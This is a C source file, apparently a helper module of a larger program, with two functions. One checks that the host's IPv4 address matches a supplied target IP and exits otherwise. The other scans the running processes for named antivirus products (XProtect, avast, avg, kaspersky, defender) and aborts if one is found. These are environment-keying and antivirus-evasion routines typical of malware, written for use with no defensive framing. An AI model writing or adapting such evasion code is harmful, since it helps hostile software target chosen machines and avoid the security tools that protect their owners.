#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include "utils.h"

const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
const int KNOWN_AV_NUM = 5;

void check_for_correct_ip(char *ip) {
    char ip_addr[NI_MAXHOST];
    struct ifaddrs *ifaddr, *ifa;
    int s, family;

    if((s = getifaddrs(&ifaddr)) != 0) {
        fprintf(stderr, "getifaddrs() failed: %s\n", strerror(s));
    }

    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), ip_addr, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if (s != 0){
            #ifdef DEBUG
            printf("getnameinfo() failed: %s\n", gai_strerror(s));
            #endif
            exit(EXIT_FAILURE);
        }

        if (strcmp(ip_addr, "127.0.0.1") == 0)
            continue;

        if(family == AF_INET) {
            #ifdef DEBUG
            printf("IPv4 %s: %s\n", ifa->ifa_name, ip_addr);
            #endif

            freeifaddrs(ifaddr);
            
            if(strcmp(ip_addr, ip) == 0) {
                return;
            } else {
                errno = ENXIO;
                fprintf(stderr, "IP address not found\n");
                exit(EXIT_FAILURE);
            }
        }
    }

    fprintf(stderr, "Family not in AF_INET\n");
    exit(EXIT_FAILURE);
}

void check_for_antivirus() {
    FILE *file = popen("ps -A", "r");

    if(!file) {
        fprintf(stderr, "popen failed\n");
        exit(EXIT_FAILURE);
    }

    char buffer[256];
    while(fgets(buffer, sizeof(buffer), file) != NULL) {
        for(int i = 0; i < KNOWN_AV_NUM; i++) {
            if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
                fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
                pclose(file);
                exit(EXIT_FAILURE);
            }
        }
    }
    
    pclose(file);
    return;
}